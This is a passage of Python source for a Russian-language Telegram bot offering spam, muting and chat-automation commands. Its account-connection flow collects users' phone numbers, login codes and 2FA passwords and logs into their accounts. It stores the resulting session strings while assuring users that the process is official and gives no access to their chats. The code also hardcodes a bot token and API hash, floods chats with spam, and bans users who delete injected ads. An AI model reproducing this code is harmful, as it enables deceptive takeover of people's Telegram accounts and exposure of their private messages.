import asyncio
import os
import psycopg2
import re
import logging
import math
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ReplyKeyboardRemove
)
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, 
    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
)

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Config
TOKEN_FROM_ENV = os.environ.get('BOT_TOKEN', '8959860095:AAGoL-Ng0r--K4l2K_I0RJusKfQLI8dzwSw')
BOT_TOKEN = TOKEN_FROM_ENV.replace(" ", "").strip()
ADMIN_ID = 5825717381
DATABASE_URL = os.environ.get('DATABASE_URL')

API_ID = 39536916
API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"

OWNER_TG_LINK = "https://t.me/NorikAmiri"
CHANNEL_URL = "https://t.me/norikX"  # ← ИЗМЕНЕНО на norikX

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# In-memory stores
mutes = {}
spam_tasks = {}
user_spam_texts = {}
link_chats = set()
reply_guard_chats = set()
typing_disabled_chats = set()
substitutions = {}
msg_cache = {}
active_chats = {}
promo_messages = {}
recent_business_chats = []
bc_owners = {}
user_usernames = {}
user_names = {}
banned_users = set()
bot_id = None
CHANNEL_LINK = None

# Для ручного добавления пользователей
manual_added_users = set()

class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

# Инструкция "Как подключить бота"
MANUAL_INSTRUCTION = (
    "🚀 <b>Инструкция по подключению бота (ручное):</b>\n\n"
    "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
    "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
    "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
    "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
    "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
    "📢 <b>Обратите внимание:</b> Бот публикует рекламные материалы в подключенных чатах. "
    "<b>Удалять рекламу строго запрещено!</b> В случае удаления рекламного сообщения вы будете заблокированы."
)

GROUP_INSTRUCTION = (
    "ℹ️ <b>Обратите внимание:</b>\n"
    "• На данный момент бот работает <b>только в личных сообщениях</b>.\n"
    "• Если вы хотите, чтобы бот мог работать и отвечать в ваших <b>группах и чатах</b>, "
    "необходимо добавить/подключить свой аккаунт.\n\n"
    "🛡️ <b>Безопасность и конфиденциальность:</b>\n"
    "• Процесс подключения <b>полностью официален и безопасен</b>.\n"
    "• Бот <b>не имеет доступа</b> к вашим личным перепискам и сторонним данным.\n"
    "• Данные используются исключительно для работы функции внутри ваших чатов.\n\n"
    "Для подключения аккаунта используйте кнопку ниже, "
    "или выполните ручную настройку по инструкции, нажав <b>«Как подключить бота»</b>."
)

TEXT_COMMANDS_HELP = (
    "📋 <b>СПИСОК КОМАНД:</b>\n\n"
    "🔹 <b>Спам:</b>\n"
    "• <code>set [текст]</code> — задать текст для спама\n"
    "• <code>ss</code> — запустить спам\n"
    "• <code>dd</code> — остановить спам\n\n"
    "🔹 <b>Модерация и управление:</b>\n"
    "• <code>.мут [минуты]</code> / <code>.размут</code> — мут/размут\n"
    "• <code>печать +</code> / <code>печать -</code> — вкл/выкл постоянную печать\n"
    "• <code>подмена [текст] [1/2/выкл]</code> — авто-подмена сообщений\n"
    "• <code>.старт</code> / <code>.стоп</code> — вкл/выкл авто-ссылку\n"
    "• <code>+реплай</code> / <code>-реплай</code> — защита от ответов реплаем\n"
    "• <code>+линк [ссылка]</code> — установить авто-ссылку\n"
    "• <code>мой ид</code> / <code>твой ид</code> — узнать ID\n"
    "• <code>!команды</code> — меню команд\n\n"
    "🔹 <b>Калькулятор:</b>\n"
    "• Просто напишите пример: <code>1458+2414</code> или <code>100*5-30</code>\n"
    "• Поддерживаются: <code>+ - * / ** % sqrt()</code>"
)

# ---- DB FUNCTIONS ----
def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))")
                cur.execute("CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)")
                cur.execute("CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)")
                cur.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)")
                cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
                cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
                cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
                cur.execute("CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
                cur.execute("CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
                conn.commit()
                
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                for row in cur.fetchall(): link_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
                for row in cur.fetchall(): reply_guard_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
                for row in cur.fetchall(): typing_disabled_chats.add(int(row[0]))
                cur.execute("SELECT chat_id, text, mode FROM substitutions")
                for row in cur.fetchall(): substitutions[int(row[0])] = {"text": row[1], "mode": row[2]}
                cur.execute("SELECT key_id, text FROM spam_texts")
                for row in cur.fetchall(): user_spam_texts[str(row[0])] = row[1]
                cur.execute("SELECT user_id FROM banned_users")
                for row in cur.fetchall(): banned_users.add(int(row[0]))
                cur.execute("SELECT user_id, username, first_name FROM user_map")
                for row in cur.fetchall():
                    uid, uname, fname = int(row[0]), row[1], row[2]
                    if uname: user_usernames[uname.lower()] = uid
                    if fname: user_names[uid] = fname
                cur.execute("SELECT user_id FROM manual_users")
                for row in cur.fetchall(): manual_added_users.add(int(row[0]))
    except Exception as e:
        logging.error(f"❌ Ошибка БД: {e}")

def save_business_account(user_id: int, username: str, first_name: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
                    (user_id, username, first_name)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения бизнес-аккаунта: {e}")

def save_manual_user(user_id: int, username: str, first_name: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO manual_users (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
                    (user_id, username, first_name)
                )
                conn.commit()
                manual_added_users.add(user_id)
    except Exception as e:
        logging.error(f"Ошибка сохранения ручного пользователя: {e}")

def delete_manual_user(user_id: int):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM manual_users WHERE user_id = %s", (user_id,))
                conn.commit()
                manual_added_users.discard(user_id)
    except Exception as e:
        logging.error(f"Ошибка удаления ручного пользователя: {e}")

def get_all_users():
    """Получить всех пользователей (бизнес-аккаунты + ручные)"""
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, username, first_name, connected_at, 'business' as type 
                    FROM business_accounts
                    UNION
                    SELECT user_id, username, first_name, added_at, 'manual' as type 
                    FROM manual_users
                    ORDER BY connected_at DESC
                """)
                return cur.fetchall()
    except Exception as e:
        logging.error(f"Ошибка получения пользователей: {e}")
        return []

def get_business_accounts():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
                return cur.fetchall()
    except Exception as e:
        logging.error(f"Ошибка получения бизнес-аккаунтов: {e}")
        return []

def delete_business_account(user_id: int):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM business_accounts WHERE user_id = %s", (user_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка удаления бизнес-аккаунта: {e}")

def save_session(user_id: int, session_str: str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_sessions (user_id, session_string) VALUES (%s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET session_string = EXCLUDED.session_string",
                    (user_id, session_str)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения сессии: {e}")

def save_user_info(user_id: int, username: str, first_name: str):
    user_id = int(user_id)
    if first_name: user_names[user_id] = first_name
    username_clean = username.lstrip("@").lower() if username else None
    if username_clean: user_usernames[username_clean] = user_id
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_map (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = COALESCE(EXCLUDED.username, user_map.username), "
                    "first_name = COALESCE(EXCLUDED.first_name, user_map.first_name)",
                    (user_id, username_clean, first_name)
                )
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка сохранения юзера: {e}")

def set_user_ban(user_id: int, ban: bool):
    user_id = int(user_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if ban:
                    cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
                    banned_users.add(user_id)
                else:
                    cur.execute("DELETE FROM banned_users WHERE user_id = %s", (user_id,))
                    banned_users.discard(user_id)
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка бана: {e}")

def save_setting(chat_id, setting_type, enabled):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if enabled:
                    cur.execute("INSERT INTO chat_settings (chat_id, setting_type) VALUES (%s, %s) ON CONFLICT DO NOTHING", (chat_id, setting_type))
                else:
                    cur.execute("DELETE FROM chat_settings WHERE chat_id = %s AND setting_type = %s", (chat_id, setting_type))
                conn.commit()
                target_set = link_chats if setting_type == 'enabled_links' else (reply_guard_chats if setting_type == 'reply_guard' else typing_disabled_chats)
                if enabled: target_set.add(chat_id)
                else: target_set.discard(chat_id)
    except Exception as e:
        logging.error(f"Ошибка сохранения настроек: {e}")

def save_substitution(chat_id, text, mode):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if text is None:
                    cur.execute("DELETE FROM substitutions WHERE chat_id = %s", (chat_id,))
                    substitutions.pop(chat_id, None)
                else:
                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s, %s, %s) ON CONFLICT (chat_id) DO UPDATE SET text = EXCLUDED.text, mode = EXCLUDED.mode", (chat_id, text, mode))
                    substitutions[chat_id] = {"text": text, "mode": mode}
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка подмены: {e}")

def save_spam_text(key_id, text):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s, %s) ON CONFLICT (key_id) DO UPDATE SET text = EXCLUDED.text", (str(key_id), text))
                conn.commit()
                user_spam_texts[str(key_id)] = text
    except Exception as e:
        logging.error(f"Ошибка сохранения текста спама: {e}")

def get_user_mention(user_id: int, fallback_name: str = None) -> str:
    user_id = int(user_id)
    fname = user_names.get(user_id) or fallback_name or "Пользователь"
    return f'<a href="tg://user?id={user_id}">{fname}</a>'

def mark_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO delivered_promo (chat_id) VALUES (%s) ON CONFLICT DO NOTHING", (chat_id,))
                conn.commit()
    except Exception as e:
        logging.error(f"Ошибка записи доставленной рекламы: {e}")

def is_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT 1 FROM delivered_promo WHERE chat_id = %s", (chat_id,))
                return cur.fetchone() is not None
    except Exception as e:
        logging.error(f"Ошибка проверки доставленной рекламы: {e}")
        return False

init_db()

# ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
async def delete_msg(chat_id, msg_id, bc_id):
    if bc_id:
        try:
            await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[msg_id])
            return
        except: pass
    try:
        await bot.delete_message(chat_id, msg_id)
    except: pass

async def edit_message(chat_id, msg_id, text, bc_id, parse_mode=None):
    try:
        kwargs = {
            "chat_id": chat_id,
            "message_id": msg_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if bc_id: kwargs["business_connection_id"] = bc_id
        await bot.edit_message_text(**kwargs)
        return True
    except Exception as e:
        logging.warning(f"Ошибка редактирования: {e}")
        return False

async def clear_cmd(chat_id, msg_id, bc_id):
    await delete_msg(chat_id, msg_id, bc_id)

async def global_typing_loop():
    while True:
        try:
            for bc_id, chats in list(active_chats.items()):
                for cid in list(chats)[-50:]:
                    if cid not in typing_disabled_chats:
                        try:
                            await bot.send_chat_action(chat_id=cid, action="typing", business_connection_id=bc_id)
                        except: pass
            await asyncio.sleep(4)
        except Exception as e:
            logging.error(f"Ошибка автоматической печати: {e}")
            await asyncio.sleep(4)

async def spam_worker(chat_id, bc_id, reply_to, text):
    try:
        words = text.split()
        while True:
            for word in words:
                kwargs = {"chat_id": chat_id, "text": word, "reply_to_message_id": reply_to}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                await asyncio.sleep(0.3)
    except asyncio.CancelledError: pass

async def unmute(user_id, chat_id, bc_id, user_name):
    if user_id in mutes:
        await asyncio.sleep((mutes[user_id]["until"] - datetime.now()).total_seconds())
        if user_id in mutes and datetime.now() >= mutes[user_id]["until"]:
            mutes.pop(user_id, None)
            user_link = get_user_mention(user_id, user_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            try: await bot.send_message(**kwargs)
            except: pass

async def promo_broadcaster():
    promo_text = "Можешь, пожалуйста, на наш канал подписаться? Если не трудно ❤️"
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]  # ← ИЗМЕНЕНО
    ])
    while True:
        await asyncio.sleep(28800)
        selected = []
        for chat_info in reversed(recent_business_chats[-100:]):
            if len(selected) >= 20: break
            cid, bc_id = chat_info
            owner_id = bc_owners.get(bc_id)
            if owner_id == ADMIN_ID or (owner_id and owner_id in banned_users): continue
            if is_chat_promo_delivered(cid): continue
            selected.append(chat_info)
        for cid, bc_id in selected:
            try:
                msg = await bot.send_message(
                    chat_id=cid, text=promo_text, parse_mode="HTML",
                    reply_markup=promo_kb, business_connection_id=bc_id
                )
                promo_messages[(cid, bc_id)] = msg.message_id
                mark_chat_promo_delivered(cid)
            except Exception as e:
                logging.warning(f"Ошибка рассылки рекламы: {e}")
            await asyncio.sleep(3)

async def check_promo_deletions():
    unban_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]
    ])
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]  # ← ИЗМЕНЕНО
    ])
    while True:
        await asyncio.sleep(15)
        for (cid, bc_id), msg_id in list(promo_messages.items()):
            owner_id = bc_owners.get(bc_id)
            if owner_id and owner_id in banned_users: continue
            try:
                await bot.edit_message_reply_markup(
                    chat_id=cid, message_id=msg_id, reply_markup=promo_kb, business_connection_id=bc_id
                )
            except TelegramBadRequest as e:
                err = str(e).lower()
                if "message to edit not found" in err or "message can't be edited" in err:
                    if owner_id:
                        set_user_ban(owner_id, True)
                        user_link = get_user_mention(owner_id)
                        try:
                            await bot.send_message(
                                chat_id=owner_id,
                                text="Вы забанены владельцем за удаление рекламы.",
                                parse_mode="HTML", reply_markup=unban_kb
                            )
                        except: pass
                    promo_messages.pop((cid, bc_id), None)
            except: pass

async def clean_inactive_connections():
    while True:
        await asyncio.sleep(300)
        inactive_bc_ids = []
        for bc_id, owner_id in list(bc_owners.items()):
            try: await bot.get_business_connection(bc_id)
            except Exception: inactive_bc_ids.append(bc_id)
        for bc_id in inactive_bc_ids:
            bc_owners.pop(bc_id, None)
            active_chats.pop(bc_id, None)
            for key in list(spam_tasks.keys()):
                if key[1] == bc_id:
                    spam_tasks[key].cancel()
                    del spam_tasks[key]
            recent_business_chats[:] = [item for item in recent_business_chats if item[1] != bc_id]

def calculate_expression(expression: str) -> tuple:
    try:
        expr = expression.replace(" ", "")
        if not re.match(r'^[\d+\-*/()%**sqrt.]+$', expr):
            return None, "❌ Некорректное выражение"
        expr = expr.replace("sqrt", "math.sqrt")
        safe_dict = {"math": math, "__builtins__": None}
        result = eval(expr, safe_dict)
        if result is None: return None, "❌ Ошибка вычисления"
        if isinstance(result, float):
            result = int(result) if result.is_integer() else round(result, 10)
        return result, None
    except ZeroDivisionError: return None, "❌ Деление на ноль!"
    except Exception as e: return None, f"❌ Ошибка: {str(e)}"

def is_calculator_expression(text: str) -> bool:
    if not text: return False
    cleaned = text.replace(" ", "")
    math_patterns = [r'[\d]+[\+\-\*/%][\d]+', r'[\d]+\*\*[\d]+', r'sqrt\([\d]+\)', r'[\d]+%[\d]+']
    for pattern in math_patterns:
        if re.search(pattern, cleaned): return True
    if re.match(r'^[\d+\-*/()%**sqrt.]+$', cleaned):
        for op in ['+', '-', '*', '/', '%', '**']:
            if op in cleaned: return True
    return False

# ---- ОБРАБОТЧИКИ БИЗНЕС-ПОДКЛЮЧЕНИЙ ----
@dp.business_connection()
async def handle_bc(bc):
    bc_owners[bc.id] = int(bc.user.id)
    save_user_info(bc.user.id, bc.user.username, bc.user.first_name)
    save_business_account(bc.user.id, bc.user.username, bc.user.first_name)
    owner_id = int(bc.user.id)
    owner_mention = get_user_mention(owner_id, bc.user.first_name)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]
    ])
    try:
        await bot.send_message(
            owner_id,
            f"👋 Привет, {owner_mention}!\n\n✅ Бот успешно подключен!\n\n{TEXT_COMMANDS_HELP}",
            parse_mode="HTML", reply_markup=kb
        )
    except Exception as e:
        logging.error(f"Не удалось отправить приветствие: {e}")

# ---- КЛАВИАТУРЫ ----
def get_start_keyboard(user_id: int):
    buttons = []
    if user_id == ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
    buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
    buttons.append([InlineKeyboardButton(text="🤖 Подключить аккаунт для групп", callback_data="btn_group_auth")])
    buttons.append([InlineKeyboardButton(text="⚡ Как подключить бота", callback_data="btn_how_to_connect")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="admin_add_user")],
        [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
    ])

def get_users_keyboard(page: int = 0):
    users = get_all_users()
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(users))
    
    for i in range(start_idx, end_idx):
        user_id, username, first_name, date, user_type = users[i]
        name = first_name or username or f"ID:{user_id}"
        display_name = f"{name[:20]}..." if len(name) > 20 else name
        type_icon = "📱" if user_type == "business" else "👤"
        keyboard.append([
            InlineKeyboardButton(
                text=f"{type_icon} {display_name}",
                callback_data=f"user_{user_id}"
            )
        ])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users_page_{page-1}"))
    if end_idx < len(users):
        nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"users_page_{page+1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ---- START ----
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    if message.chat.type != "private": return
    uid = message.from_user.id
    save_user_info(uid, message.from_user.username, message.from_user.first_name)
    user_mention = get_user_mention(uid, message.from_user.first_name)
    await message.answer(
        f"👋 Добро пожаловать, {user_mention}!\n\n"
        f"💬 Бот управляет функциями вашего аккаунта и помогает в работе.\n\n"
        f"Выберите раздел:",
        parse_mode="HTML",
        reply_markup=get_start_keyboard(uid)
    )

@dp.message(F.text.in_(["/admin", ".админ", "админ"]))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

# ---- ОБРАБОТЧИКИ КНОПОК ----
@dp.callback_query(F.data == "btn_features")
async def features(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")

@dp.callback_query(F.data == "btn_how_to_connect")
async def how_to_connect(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)

@dp.callback_query(F.data == "btn_group_auth")
async def group_auth(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    
    # Проверяем, не идет ли уже авторизация
    current_state = await state.get_state()
    if current_state in (AuthState.waiting_for_phone.state, AuthState.waiting_for_code.state, AuthState.waiting_for_2fa.state):
        await callback.message.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.")
        return
    
    # Отправляем инструкцию с кнопкой для номера
    builder = ReplyKeyboardBuilder()
    builder.button(text="📱 Отправить номер телефона", request_contact=True)
    builder.adjust(1)
    
    await callback.message.answer(
        f"{GROUP_INSTRUCTION}\n\n"
        "📱 Нажмите кнопку ниже, чтобы передать номер телефона для авторизации:",
        parse_mode="HTML",
        reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
    )
    await state.set_state(AuthState.waiting_for_phone)

# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
@dp.message(AuthState.waiting_for_phone, F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
    
    try:
        if message.contact:
            phone = message.contact.phone_number
        else:
            phone = message.text.strip()
            phone = re.sub(r'[^\d+]', '', phone)
            if phone.startswith('8') and len(phone) == 11:
                phone = '+7' + phone[1:]
            elif not phone.startswith('+'):
                phone = '+' + phone
        
        logging.info(f"Обработка номера: {phone}")
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        if len(phone) < 10:
            raise ValueError("Некорректный номер телефона")
        
        try:
            res = await client.send_code_request(phone)
            logging.info(f"Код отправлен на номер {phone}, hash: {res.phone_code_hash}")
            
            await state.update_data(
                phone=phone,
                phone_code_hash=res.phone_code_hash,
                session_str=client.session.save()
            )
            
            await msg.edit_text(
                f"📱 <b>Код подтверждения отправлен!</b>\n\n"
                f"Номер: <code>{phone}</code>\n\n"
                f"Введите код из Telegram (только цифры):\n"
                f"<i>Например: 12345</i>\n\n"
                f"⚠️ Если код не приходит, проверьте:\n"
                f"• Правильность номера телефона\n"
                f"• Интернет-соединение\n"
                f"• Не блокирует ли Telegram запросы",
                parse_mode="HTML"
            )
            await state.set_state(AuthState.waiting_for_code)
            
        except FloodWaitError as e:
            await msg.edit_text(f"⏳ Слишком много попыток. Подождите {e.seconds} секунд.")
            await state.clear()
        except PhoneNumberInvalidError:
            await msg.edit_text("❌ Некорректный номер телефона. Проверьте правильность ввода.")
            await state.clear()
            
        await client.disconnect()
        
    except PhoneNumberInvalidError:
        await msg.edit_text("❌ Некорректный номер телефона. Проверьте правильность ввода.")
        await state.clear()
    except ValueError as e:
        await msg.edit_text(f"❌ {str(e)}")
        await state.clear()
    except Exception as e:
        logging.error(f"Ошибка при отправке кода: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново, нажав кнопку «Подключить аккаунт для групп».")
        await state.clear()

@dp.message(AuthState.waiting_for_code, F.text)
async def process_code(message: Message, state: FSMContext):
    # Очищаем код от пробелов и лишних символов
    code = re.sub(r'\s+', '', message.text.strip())
    
    # Проверяем, что код состоит только из цифр
    if not code.isdigit():
        await message.answer("❌ Код должен содержать только цифры. Попробуйте еще раз:")
        return
    
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    session_str = data.get("session_str")

    if not phone or not phone_code_hash:
        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт для групп».")
        await state.clear()
        return

    # Отправляем сообщение о проверке
    checking_msg = await message.answer("🔄 Проверка кода...")
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()

    try:
        # Пробуем войти с кодом
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await client.disconnect()

        await checking_msg.delete()
        await message.answer(
            "✅ <b>Аккаунт успешно подключен!</b>\n\n"
            "Теперь юзербот активен во всех чатах, где вы его используете.\n\n"
            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.\n\n"
            f"{TEXT_COMMANDS_HELP}",
            parse_mode="HTML"
        )
        await state.clear()
        
    except SessionPasswordNeededError:
        await client.disconnect()
        await checking_msg.delete()
        await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
        await state.set_state(AuthState.waiting_for_2fa)
        
    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
        await client.disconnect()
        await checking_msg.delete()
        await message.answer(
            f"❌ Неверный или истекший код.\n\n"
            f"Попробуйте ещё раз. Код должен состоять только из цифр.\n"
            f"Если код не подходит, запросите новый код заново.",
            parse_mode="HTML"
        )
        # Не очищаем состояние, чтобы пользователь мог ввести код снова
        
    except Exception as e:
        await client.disconnect()
        await checking_msg.delete()
        logging.error(f"Ошибка входа: {e}")
        error_msg = str(e)
        if "CODE_INVALID" in error_msg:
            await message.answer("❌ Неверный код подтверждения. Попробуйте еще раз.")
        elif "FLOOD" in error_msg:
            await message.answer("⏳ Слишком много попыток. Подождите несколько минут.")
        else:
            await message.answer(f"❌ Ошибка входа: {error_msg}\nНачните заново через кнопку «Подключить аккаунт для групп».")
            await state.clear()

@dp.message(AuthState.waiting_for_2fa, F.text)
async def process_2fa(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    session_str = data.get("session_str")

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()

    try:
        await client.sign_in(password=password)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await client.disconnect()

        await message.answer(
            "✅ <b>Авторизация успешна!</b> Юзербот подключен.\n\n"
            "Чтобы использовать бота в чатах, добавьте его в раздел «Автоматизация чатов» в настройках Telegram.\n\n"
            f"{TEXT_COMMANDS_HELP}",
            parse_mode="HTML"
        )
        await state.clear()
        
    except Exception as e:
        await client.disconnect()
        await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте ввести пароль еще раз:")

# ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ ----
@dp.message()
@dp.business_message()
async def handle(message: Message):
    global bot_id, CHANNEL_LINK
    
    try:
        if not message.from_user or message.from_user.is_bot: return
        uid = int(message.from_user.id)
        chat_id = int(message.chat.id)
        bc_id = message.business_connection_id
        save_user_info(uid, message.from_user.username, message.from_user.first_name)
        owner_id = bc_owners.get(bc_id) if bc_id else None

        if bc_id:
            chat_tuple = (chat_id, bc_id)
            if chat_tuple in recent_business_chats:
                recent_business_chats.remove(chat_tuple)
            recent_business_chats.append(chat_tuple)
            if len(recent_business_chats) > 100:
                recent_business_chats.pop(0)

        if uid in banned_users or (owner_id and owner_id in banned_users): return

        if bc_id:
            if bc_id not in bc_owners:
                try:
                    conn_info = await bot.get_business_connection(bc_id)
                    bc_owners[bc_id] = int(conn_info.user.id)
                    save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
